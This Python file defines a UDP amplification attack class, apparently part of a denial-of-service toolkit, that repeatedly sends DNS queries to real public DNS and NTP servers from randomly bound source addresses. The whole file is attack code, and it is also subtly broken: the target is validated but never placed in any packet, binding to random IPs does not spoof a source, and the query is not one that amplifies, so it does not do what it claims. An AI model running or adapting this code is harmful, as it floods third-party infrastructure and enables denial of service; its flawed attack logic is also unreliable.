import socket
import random
import asyncio
from core.ethical_check import EthicalEnforcer
from core.network_utils import random_ip

class UDPAmplification:
    def __init__(self):
        self.eth = EthicalEnforcer()
        self.reflectors = [
            ('8.8.8.8', 53),  # DNS
            ('216.239.35.0', 123),  # NTP
            ('162.159.200.1', 123)  # NTP
        ]

    async def attack(self, config):
        self.eth.validate_target(config.target)
        packets_sent = 0
        
        while True:
            if config.packets > 0 and packets_sent >= config.packets:
                break
                
            reflector = random.choice(self.reflectors)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.bind((random_ip(), 0))
            
            payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01'
            sock.sendto(payload, reflector)
            packets_sent += 1
            
            if packets_sent % 100 == 0:
                print(f"Sent {packets_sent} amplification requests", end='\r')
            await asyncio.sleep(0.01)
        
        print(f"\nAmplification attack completed. Total packets: {packets_sent}")